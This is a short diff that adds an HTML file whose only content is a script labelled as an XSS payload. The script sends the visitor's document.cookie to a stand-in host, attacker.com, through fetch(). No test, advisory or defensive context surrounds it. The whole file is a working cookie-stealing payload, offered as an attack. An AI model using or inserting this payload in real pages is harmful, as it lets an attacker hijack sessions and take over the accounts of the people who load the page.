@@ -1,0 +1,8 @@
+<html>
+  <body>
+    <script>
+      // XSS payload to steal cookies or session information
+      fetch('http://attacker.com/steal?cookie=' + document.cookie);
+    </script>
+  </body>
+</html>
